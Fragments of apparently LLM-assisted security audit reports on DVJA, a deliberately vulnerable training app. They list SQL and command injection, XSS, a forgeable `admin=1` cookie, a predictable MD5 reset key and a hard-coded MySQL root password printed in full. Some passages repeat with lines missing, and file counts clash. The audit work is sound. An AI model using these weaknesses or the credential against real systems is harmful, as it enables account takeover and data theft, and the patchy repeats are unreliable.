7: Struts2 wires every route through `src/main/resources/struts.xml`, dispatched by the single `StrutsPrepareAndExecuteFilter` mapped to `/*` in `web.xml` (there is no other routing layer, no servlet-level `@WebServlet`, and no Spring MVC `@Controller`). Authorization in this app is entirely the `authenticationInterceptor` → `authenticationStack` defined at struts.xml lines 14-22, which simply checks `session.get("USER") != null` (`AuthenticationInterceptor.java` lines 15-22) and otherwise routes to the global `login` result. There is no role/permission interceptor anywhere in the file — only presence-of-session is ever checked by the framework layer; anything stronger (e.g. admin-only) has to be hand-written inside the action, and I checked every action for whether it does that.
8: 
9: | Action (route) | Class.method | Interceptor chain in front of it | Unauthenticated caller | Authenticated caller, wrong identity |
10: | --- | --- | --- | --- | --- |
11: | `login` (34-39) | `Login` | none → `defaultStack` | reaches it (by design) | reaches it |
12: | `logout` (35-39) | `Login.logout` | none → `defaultStack` | reaches it (no-op) | reaches it, clears own session attribute only (see finding) |
13: | `register` (41-44) | `Register` | none → `defaultStack` | reaches it (by design) | reaches it |
14: | `home` / `assessmentHome` (46-54) | `Home` / `Home.assessment` | `authenticationStack` | redirected to login | reaches own dashboard |
15: | `userSearch` (56-60) | `UserAction.search` | `authenticationStack` | redirected to login | reaches it, looks up by login via a string-concatenated query (`findByLoginUnsafe`, out of this department's scope — SQLi, flagged for the injection department) |
16: | `editUser` (62-66) | `UserAction.edit` | `authenticationStack`, **no CSRF token** | redirected to login | reaches it; the handler itself forces `userId` back to the caller's own id before saving (read in full — this closes the classic IDOR the project's own `docs/solution/a4-*.md` describes, so I did **not** file that as a live finding), but the route accepts a forged cross-site POST with no token (finding) |
17: | `ping` (68-72) | `PingAction` | `authenticationStack` | redirected to login | reaches it |
18: | `listProduct` (74-77) | `ProductAction.list` | `authenticationStack` | redirected to login | reaches it |
19: | `addEditProduct` (79-85) | `ProductAction.execute` | `authenticationStack`, **no CSRF token** | redirected to login | reaches it; can create/edit any product; no token (finding) |
20: | `resetPasswordStart` (87-90) | `ResetPassword.requestResetPassword` | none → `defaultStack` | reaches it (by design, this is the public entry point) | reaches it |

33: ## Executive summary
34: 
35: This review covers the sensitive-data surface of dvja (Damn Vulnerable Java
36: Application), a deliberately vulnerable Struts2/Spring/Hibernate app, in the
37: locked tree at `/home/user/targets/dvja`. It found 7 issues: 2 critical, 3
38: high, 2 medium. The most important: (1) the password-reset key is a plain
39: MD5(login) with no secret or expiry, giving unauthenticated full account
40: takeover (`UserService.java:90`); (2) `/api/userList` exports every user's id,
41: login, email and role once a caller sends a self-set `admin=1` cookie
42: (`ApiAction.java:40-41`); (3) passwords are stored with unsalted MD5
43: (`UserService.java:109`), and the new password is additionally written to the
44: log in cleartext during a reset (`UserService.java:93-94`). Coverage included
45: the Struts controllers, the authentication/registration services, the User
46: model, the Struts/Spring/log4j2 configuration and the committed database
47: credentials; it did not cover the actual network transport (no server-side
48: TLS termination is configured anywhere in the tree read, so it cannot be
49: statically confirmed either way) or third-party dependencies (see "What was
50: not covered"). Method: read the Struts entry points (`struts.xml`), trace
51: login/email/password/key fields from controllers to their sinks (log,
52: JSON response, storage), one finding per sink, exact line quoted, confidence
53: stated for each.

64: SHA-256 in `target.json`. In scope for this department: every `.java`
65: controller and service under `src/main/java/com/appsecco/dvja`, the `User`
66: model, `struts.xml`, `applicationContext.xml`, `log4j2.xml`,
67: `persistence.xml`, `config.properties`, `docker-compose.yml`, `Dockerfile`,
68: and `db/schema.sql`. Files actually opened and read line-by-line:
69: `UserAuthenticationService.java`, `UserRegistrationService.java`,
70: `UserService.java`, `User.java`, `Login.java`, `Register.java`,

This review covers the sensitive-data surface of dvja (Damn Vulnerable Java
Application), a deliberately vulnerable Struts2/Spring/Hibernate app, in the
locked tree at `/home/user/targets/dvja`. It found 7 issues: 2 critical, 3
high, 2 medium. The most important: (1) the password-reset key is a plain
MD5(login) with no secret or expiry, giving unauthenticated full account
login, email and role once a caller sends a self-set `admin=1` cookie
(`ApiAction.java:40-41`); (3) passwords are stored with unsalted MD5
(`UserService.java:109`), and the new password is additionally written to the
log in cleartext during a reset (`UserService.java:93-94`). Coverage included
the Struts controllers, the authentication/registration services, the User
model, the Struts/Spring/log4j2 configuration and the committed database
credentials; it did not cover the actual network transport (no server-side
TLS termination is configured anywhere in the tree read, so it cannot be
statically confirmed either way) or third-party dependencies (see "What was
not covered"). Method: read the Struts entry points (`struts.xml`), trace
login/email/password/key fields from controllers to their sinks (log,
JSON response, storage), one finding per sink, exact line quoted, confidence
Target: `/home/user/targets/dvja`, 174 files (`.git` excluded), locked to the
SHA-256 in `target.json`. In scope for this department: every `.java`
and `db/schema.sql`. Files actually opened and read line-by-line:
a sample of the JSP views (`UserEdit.jsp`, `Ping.jsp`) to confirm what a
rendered page discloses. Method follows the review-method skill: entry points
first (Struts actions in `struts.xml`), then each attacker- or
user-controlled field (login, password, reset key, admin cookie) traced
forward to its sink (log statement, JSON response, persisted column). This is
a static, LLM-assisted read of the source as committed; no scanner run was
available/used for this pass beyond manual tracing, and no runtime instance

- `data-003` — Password-reset key is a deterministic MD5 hash of the login, not a secret (`src/main/java/com/appsecco/dvja/services/UserService.java:90`, CWE-640, confirmed) — lets anyone who knows a login compute the reset key and take over that account with no authentication.

- `data-006` — Bulk export of every user's PII is gated only by a client-supplied cookie (`src/main/java/com/appsecco/dvja/controllers/ApiAction.java:40`, CWE-602, confirmed) — dumps every user's id/login/email/role to any caller who sends `Cookie: admin=1`.

- `data-001` — Passwords hashed with unsalted MD5 instead of a slow, salted hash (`src/main/java/com/appsecco/dvja/services/UserService.java:109`, CWE-327, confirmed) — a leaked `users` table is trivially crackable.

- `data-005` — Unauthenticated API endpoint discloses any user's email address (`src/main/java/com/appsecco/dvja/controllers/ApiAction.java:79`, CWE-200, confirmed) — enables account enumeration and phishing with no login required.

- `data-007` — MySQL root credentials committed to the repository in cleartext (`src/main/webapp/WEB-INF/config.properties:4`, CWE-798, confirmed) — anyone with repo access gets full database read/write.

- `data-002` — New password logged in cleartext during password reset (`src/main/java/com/appsecco/dvja/services/UserService.java:93`, CWE-532, confirmed) — exposes plaintext passwords to anyone with log access.
- `data-004` — Struts2 devMode is enabled, exposing debug information to clients (`src/main/resources/struts.xml:7`, CWE-215, likely) — verbose stack traces and internal state reach error responses.

- Runtime/network transport: whether HTTPS/TLS terminates in front of this app (e.g. a reverse proxy) is infrastructure this static review cannot see; no `http://` outbound calls or TLS-disabling code (`rejectUnauthorized`, custom trust managers) were found in the Java sources read, so no transport finding is reported either way.
- Third-party dependency versions (`pom.xml`) and their known CVEs were not analyzed here; that belongs to the dependencies department.

- The JSP view layer was sampled (`UserEdit.jsp`, `Ping.jsp`) rather than read exhaustively; other views under `src/main/webapp/WEB-INF/dvja/` were not individually traced for reflected sensitive data.

- `ProductAction.java`, `ProductService.java`, `RedirectAction.java`, `Constant.java` and the `com.appsecco.example` package were located but not traced end-to-end for this department, since no personal-data or credential flow through them was identified during triage.

- Authentication/session/CSRF/IDOR weaknesses (e.g. the trivially forgeable `admin` cookie, or SQL injection in `findByLoginUnsafe`) are noted here only where they are the enabling cause of a data-exposure sink; their own class of bug is the access/injection departments' remit.
- No semgrep run was available in this session (tool not exercised); all findings above come from direct reading of the cited files.

1: # Injection and traversal — department report
2: 
3: ## Scope and method
4: 
5: Target: `/home/user/targets/dvja` (locked by `target.json`, sha256
6: `014b5713f91d7c23181b282f75b1e8220f54f5d5de5e0ea36f28e1c456a80982`), a Java/Struts2/JPA
7: web application ("Damn Vulnerable Java Application"), 183 files under review.
8: 
9: This is a language-model review grounded by static reading of the source and by
10: this program's mechanical examiner (`verify-safety-report.mjs`); no scanner ran
11: in this session (semgrep was not invoked because the routine reading of the
12: entry points and their sinks was small enough to do by hand and gave higher
13: confidence than a pattern match).
14: 
15: Method: enumerated every Struts action mapping in `src/main/resources/struts.xml`
16: and `example.xml`, then read every controller (`src/main/java/com/appsecco/dvja/controllers/*.java`)
17: those actions invoke, every service (`src/main/java/com/appsecco/dvja/services/*.java`)
18: a controller calls, and every JSP view (`src/main/webapp/WEB-INF/dvja/*.jsp`) a result
19: renders, tracing each request-bound field (via Struts' `params` interceptor, which
20: binds request parameters to an action's JavaBean setters by name) from the HTTP
21: request to a JPQL query, a shell command, or an HTML/redirect sink. Files actually
22: read include: `struts.xml`, all ten controllers, all four services, `AuthenticationInterceptor.java`,
23: `Product.java`, and the JSP views for product search/edit, user search, ping, and
24: registration/login/reset flows.
25: 
26: ## Findings
27: 
28: Six confirmed findings, all traced end-to-end from an HTTP request parameter to
29: the cited sink with no intervening sanitizer:
30: 
31: 1. **SQL injection — `UserService.findByLoginUnsafe`** (`src/main/java/com/appsecco/dvja/services/UserService.java:75`,
32:    CWE-89, critical). The `userSearch` action binds the request's `login`
33:    field straight to a JPQL string built by concatenation with no parameter
34:    binding, even though the file has a safe, parameterized `findByLogin` two
35:    methods above that the unsafe path bypasses.
36: 2. **SQL injection — `ProductService.findContainingName`** (`src/main/java/com/appsecco/dvja/services/ProductService.java:48`,
37:    CWE-89, critical). The `listProduct` action's `searchQuery` field is
38:    concatenated straight into a JPQL `LIKE` clause.
39: 3. **OS command injection — `PingAction.doExecCommand`** (`src/main/java/com/appsecco/dvja/controllers/PingAction.java:45`,
40:    CWE-78, critical). The `ping` action's `address` field is concatenated
41:    into a string handed to `/bin/bash -c`.
42: 4. **Reflected XSS — product search banner** (`src/main/webapp/WEB-INF/dvja/ProductList.jsp:23`,
43:    CWE-79, medium). The page reads `searchQuery` a second time, straight off
44:    the raw servlet request, and writes it with a `<%= %>` scriptlet instead of
45:    the auto-escaping `<s:property>` tag used everywhere else on the same page.
46: 5. **Stored XSS — product name rendered unescaped** (`src/main/webapp/WEB-INF/dvja/ProductList.jsp:42`,
47:    CWE-79, high). `addEditProduct` lets any authenticated user set an
48:    arbitrary `product.name`, persisted unsanitized; the product list then
49:    renders it with `escape="false"`, executing for every viewer.
50: 6. **Open redirect — `redirect` action** (`src/main/resources/struts.xml:101`,
51:    CWE-601, medium). The unauthenticated `redirect` action sends the browser
52:    to whatever `url` request parameter it is given, with no allowlist.
53: 
54: All six carry `confidence: confirmed`: for each, the source (the request
55: parameter and the exact form field or query-string name that carries it), every
56: intermediate method, and the sink were read, and no guard on the path — only the
57: session-presence check in `AuthenticationInterceptor.java`, which does not
58: validate or escape any action field — stops the tainted value from reaching the
59: sink.
60: 
61: Full detail — exact evidence chain, impact, and fix — is in `findings/injection.json`.
62: 
63: ## What was not covered
64: 
65: - **Path traversal**: no `File`, `FileInputStream`/`FileOutputStream`,
66:   `Paths.get`, or `sendFile`-style call taking request data was found anywhere
67:   under `src/` (grepped for these APIs across the whole tree); the application
68:   reads/writes only through JPA entities, so this class of sink does not appear
69:   present, but this was a negative grep result, not an exhaustive trace of
70:   every file I/O path a dependency might expose.
71: - **NoSQL / `$where` / `eval` / `new Function` / string-bodied timers**: this
72:   is a server-side Java/JPA application with no JavaScript, NoSQL, or
73:   server-side template-string-as-code pattern in the reviewed code; this
74:   category does not apply here.
75: - **The `com.appsecco.example.*` package** (Struts "example" tutorial actions
76:   bundled with the app, mapped from `src/main/resources/example.xml`) was read
77:   and found to contain only boilerplate `HelloWorld`/`Login` sample actions
78:   with no sinks; it was not traced as deeply as the `dvja` package since it is
79:   not part of the application's real functionality.
80: - **`ApiAction.ping`/`ApiAction.adminShowUsers`** (`src/main/java/com/appsecco/dvja/controllers/ApiAction.java`)
81:   were read: `ping` calls the safe, parameterized `findByLogin`, and
82:   `adminShowUsers`'s only access check is an unsigned `admin=1` cookie — a
83:   real access-control bug, but it is not an injection or traversal sink, so it

12: - Application code that touches credentials: `src/main/java/com/appsecco/dvja/services/UserAuthenticationService.java`, `UserRegistrationService.java`, `UserService.java`, `models/User.java`, `controllers/Login.java`, `Register.java`, `ResetPassword.java`, `UserAction.java`, the `com.appsecco.example` sample package.
13: - IDE project files under `.idea/` (checked for embedded credentials; none found).
14: - A repository-wide grep for assignment patterns on `password|passwd|secret|token|credential|apikey|private_key`, and for base64/hex-length literals, to find every candidate line before reading it.
15: 
16: The published DVJA project intentionally ships several classes of vulnerability for training; this department covers only hard-coded credentials and leaked configuration, not the OWASP Top 10 exercises documented under `docs/`.
17: 
18: ## Findings
19: 
20: ### High
21: 
22: - **`dvja-secrets-001`** — MySQL root password hard-coded in committed `docker-compose.yml` (`mysql` service) (`docker-compose.yml:8`, CWE-798, confirmed). The literal `MYSQL_ROOT_PASSWORD: ec95c258266b8e985848cae688effa2b` initializes the root account of the `mysql:5.5` container on first start. Impact: anyone with the repository has the DB container's root password. Fix: move to an untracked `.env`/Docker secret and rotate.
23: 
24: - **`dvja-secrets-002`** — Same MySQL root password re-declared as `MYSQL_PASSWORD` for the `app` service and actually used at runtime (`docker-compose.yml:17`, CWE-798, confirmed). `scripts/start.sh` (read) passes `$MYSQL_USER`/`$MYSQL_PASSWORD` straight to the `mysql` CLI (`start.sh:6-7`) to create the database and load `db/schema.sql` as root on every container start — this is a live credential, not a fixture. Fix: use a low-privilege account and externalize the value.
25: 
26: - **`dvja-secrets-003`** — Same MySQL root password hard-coded a third time inside the deployed WAR's `config.properties` and wired into the live Spring `DataSource` (`src/main/webapp/WEB-INF/config.properties:4`, CWE-798, confirmed). `applicationContext.xml` (read) loads this exact file (`applicationContext.xml:15`) and builds `DriverManagerDataSource` with `${mysql.password}`/`${mysql.username}` (`applicationContext.xml:21-22`) — this is the credential the running application actually connects to MySQL with for every query against the `users` table (which stores account password hashes, per `db/schema.sql:51`). Fix: externalize via environment/secrets manager, use least privilege, rotate.
27: 
28: All three findings share the same underlying secret value (`ec95c258266b8e985848cae688effa2b`) committed across three independent files/layers (orchestration, container runtime script, and the deployed application archive itself), so fixing one occurrence does not remediate the others — each is reported separately per the one-finding-per-sink rule, and the fix for all three requires the same rotation step.
29: 
30: ## What was not covered
31: 
32: - **Git history** was not inspected (`git log -p`, gitleaks/trufflehog over all reachable blobs) — this review read the working tree at the locked commit only, per `target.json`. If the password was ever different in an earlier commit, that value is not accounted for here.
33: - **Third-party/vendor asset files** (`src/main/webapp/assets/fa/**`, `jquery-3.2.1.min.js`, `showdown.min.js`) were grepped but not fully read line by line; they are unmodified upstream library code and no credential-shaped literal matched.

35: - **Runtime/deployment secrets** actually used outside this repository (a real `.env` file supplied at `docker-compose up` time, CI/CD secret store, cloud provider credentials) are outside what a static read of this tree can confirm — this review can only say what is committed, not what an operator may have overridden it with.
36: - **Predictable/weak token generation** (e.g. how the password-reset `key` referenced in the docs is generated in `ResetPassword.java`/`UserService.java`) is a separate class of bug (weak randomness, CWE-330) and was not scored here; this department covers literal hard-coded credentials only.

lines.text: # Secrets — hard-coded credentials and leaked configuration

This review is a language-model read of the `dvja` target tree (`/home/user/targets/dvja`, locked at the sha256 recorded in `target.json`, 174 files). No scanner was invoked in this run (`semgrep` was not used); every finding below was read directly with a line-numbered file reader, not inferred from a grep hit.
The following categories were actually opened and read, in this order:

- Application code that touches credentials: `src/main/java/com/appsecco/dvja/services/UserAuthenticationService.java`, `UserRegistrationService.java`, `UserService.java`, `models/User.java`, `controllers/Login.java`, `Register.java`, `ResetPassword.java`, `UserAction.java`, the `com.appsecco.example` sample package.
- IDE project files under `.idea/` (checked for embedded credentials; none found).
- A repository-wide grep for assignment patterns on `password|passwd|secret|token|credential|apikey|private_key`, and for base64/hex-length literals, to find every candidate line before reading it.

The published DVJA project intentionally ships several classes of vulnerability for training; this department covers only hard-coded credentials and leaked configuration, not the OWASP Top 10 exercises documented under `docs/`.

- **`dvja-secrets-001`** — MySQL root password hard-coded in committed `docker-compose.yml` (`mysql` service) (`docker-compose.yml:8`, CWE-798, confirmed). The literal `MYSQL_ROOT_PASSWORD: ec95c258266b8e985848cae688effa2b` initializes the root account of the `mysql:5.5` container on first start. Impact: anyone with the repository has the DB container's root password. Fix: move to an untracked `.env`/Docker secret and rotate.

- **`dvja-secrets-002`** — Same MySQL root password re-declared as `MYSQL_PASSWORD` for the `app` service and actually used at runtime (`docker-compose.yml:17`, CWE-798, confirmed). `scripts/start.sh` (read) passes `$MYSQL_USER`/`$MYSQL_PASSWORD` straight to the `mysql` CLI (`start.sh:6-7`) to create the database and load `db/schema.sql` as root on every container start — this is a live credential, not a fixture. Fix: use a low-privilege account and externalize the value.

- **`dvja-secrets-003`** — Same MySQL root password hard-coded a third time inside the deployed WAR's `config.properties` and wired into the live Spring `DataSource` (`src/main/webapp/WEB-INF/config.properties:4`, CWE-798, confirmed). `applicationContext.xml` (read) loads this exact file (`applicationContext.xml:15`) and builds `DriverManagerDataSource` with `${mysql.password}`/`${mysql.username}` (`applicationContext.xml:21-22`) — this is the credential the running application actually connects to MySQL with for every query against the `users` table (which stores account password hashes, per `db/schema.sql:51`). Fix: externalize via environment/secrets manager, use least privilege, rotate.

All three findings share the same underlying secret value (`ec95c258266b8e985848cae688effa2b`) committed across three independent files/layers (orchestration, container runtime script, and the deployed application archive itself), so fixing one occurrence does not remediate the others — each is reported separately per the one-finding-per-sink rule, and the fix for all three requires the same rotation step.

- **Git history** was not inspected (`git log -p`, gitleaks/trufflehog over all reachable blobs) — this review read the working tree at the locked commit only, per `target.json`. If the password was ever different in an earlier commit, that value is not accounted for here.

- **Third-party/vendor asset files** (`src/main/webapp/assets/fa/**`, `jquery-3.2.1.min.js`, `showdown.min.js`) were grepped but not fully read line by line; they are unmodified upstream library code and no credential-shaped literal matched.

- **JSP view files** under `src/main/webapp/WEB-INF/dvja/**` and **`docs/`** markdown were grepped for credential patterns (password/secret/token/key assignments, long base64/hex strings) with no true-positive hits beyond documentation prose (e.g. a reset-password `key=` example URL in `docs/solution/a2-broken-authentication-and-session-management.md:8`, which is a walkthrough example, not a value the running service reads as a credential); they were not each opened individually beyond that grep pass.

- **Runtime/deployment secrets** actually used outside this repository (a real `.env` file supplied at `docker-compose up` time, CI/CD secret store, cloud provider credentials) are outside what a static read of this tree can confirm — this review can only say what is committed, not what an operator may have overridden it with.

- **Predictable/weak token generation** (e.g. how the password-reset `key` referenced in the docs is generated in `ResetPassword.java`/`UserService.java`) is a separate class of bug (weak randomness, CWE-330) and was not scored here; this department covers literal hard-coded credentials only.
- No `semgrep` run was performed in this session (the tool's `--config` fixture path was not exercised); all findings above come from direct reading, not scanner triage.
